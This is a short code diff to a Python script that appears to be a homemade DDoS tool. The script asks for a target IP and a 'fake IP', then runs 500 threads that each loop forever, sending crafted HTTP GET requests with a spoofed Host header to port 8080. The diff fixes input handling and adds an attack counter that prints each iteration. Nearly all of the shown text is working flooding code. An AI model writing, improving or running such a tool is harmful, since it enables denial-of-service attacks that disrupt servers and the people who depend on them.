@@ -10,9 +10,10 @@ print("\u001b[32;1mMy GitHub {" + "https://github.com/shervin-glitch" + "\u001b[
 
 time.sleep(2.5)
 
-target = int(input(G + "Enter The Target's IP =>"))
-port = 80
-fake_ip = int(input(G + "Enter Your Fake IP Here =>"))
+target = str(input(G + "Enter The Target's IP =>"))
+port = 8080
+fake_ip = str(input(G + "Enter Your Fake IP Here =>"))
+attack_log = 0
 
 def ddos():
     while True:
@@ -21,6 +22,10 @@ def ddos():
         s.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii") , (target , port))
         s.sendto((f"HOST : {fake_ip}\r\n\r\n").encode("ascii") , (target , port))
         s.close()
+
+        global attack_log
+        attack_log += 1
+        print(attack_log)
 
 for i in range(500):
     thread = threading.Thread(target = ddos)
